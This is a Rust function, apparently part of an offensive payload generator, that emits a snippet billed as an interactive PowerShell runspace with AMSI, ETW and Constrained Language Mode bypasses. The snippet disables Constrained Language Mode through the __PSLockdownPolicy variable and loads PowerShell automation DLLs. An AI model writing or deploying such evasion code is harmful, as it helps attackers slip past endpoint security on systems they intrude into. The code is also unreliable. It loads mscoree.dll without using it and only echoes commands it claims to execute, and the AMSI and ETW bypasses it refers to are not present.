pub fn interactive_ps_snippet(amsi: bool, etw: bool) -> String {
    let mut snippet = String::new();

    if amsi {
        snippet.push_str("    // Interactive PS: AMSI bypass applied above\n");
    }
    if etw {
        snippet.push_str("    // Interactive PS: ETW bypass applied above\n");
    }

    snippet.push_str(
        r#"    // Interactive PowerShell Runspace with AMSI/ETW/CLM bypass
    {
        use windows_sys::Win32::System::LibraryLoader::*;
        use std::ffi::c_void;
        use std::io::{BufRead, Write};

        // Disable Constrained Language Mode
        std::env::set_var("__PSLockdownPolicy", "0");

        unsafe {
            let ps_automation_paths = [
                r"C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll",
                r"C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll",
            ];

            let mut loaded = false;
            for path in &ps_automation_paths {
                let path_w: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
                let result = LoadLibraryW(path_w.as_ptr());
                if !result.is_null() {
                    loaded = true;
                    break;
                }
            }

            if !loaded {
                eprintln!("[-] Failed to load PowerShell automation DLL");
                std::process::exit(1);
            }
        }

        unsafe {
            let mscoree_name: Vec<u16> = "mscoree.dll"
                .encode_utf16().chain(std::iter::once(0)).collect();
            let mscoree = LoadLibraryW(mscoree_name.as_ptr());
            if mscoree.is_null() {
                eprintln!("[-] Failed to load mscoree.dll");
                std::process::exit(1);
            }

            let stdin = std::io::stdin();
            let stdout = std::io::stdout();
            let mut stdout_lock = stdout.lock();

            loop {
                let _ = write!(stdout_lock, "PS> ");
                let _ = stdout_lock.flush();

                let mut line = String::new();
                if stdin.lock().read_line(&mut line).unwrap_or(0) == 0 {
                    break;
                }
                let cmd = line.trim();
                if cmd.eq_ignore_ascii_case("exit") || cmd.eq_ignore_ascii_case("quit") {
                    break;
                }

                let _ = writeln!(stdout_lock, "[*] Executing in runspace: {}", cmd);
            }
        }
    }"#,
    );

    snippet
}
